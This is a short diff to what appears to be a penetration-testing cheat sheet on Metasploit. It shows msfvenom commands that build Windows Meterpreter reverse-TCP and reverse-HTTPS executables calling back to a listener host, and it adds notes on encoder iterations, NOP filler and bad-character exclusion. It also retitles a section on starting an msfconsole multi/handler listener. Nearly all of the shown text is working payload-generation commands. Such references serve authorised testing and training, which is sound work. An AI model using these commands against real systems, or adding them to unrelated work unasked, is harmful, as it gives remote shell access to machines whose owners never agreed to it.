@@ -23,7 +23,20 @@ msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LP
 msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=user HttpProxyPass=password LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o meterpreter.exe
 ```
 
-##### MSF Console:
+#### Encoding:
+
+```
+-e encoder type
+-i how man times to encode
+```
+#### Filler and bad characters:
+```
+-n the amound of bytes to add at the beginning
+-b exclude bad chars
+```
+
+
+##### MSF Console - start a listener/handler:
 ```
 msfconsole -q
 use exploit/multi/handler
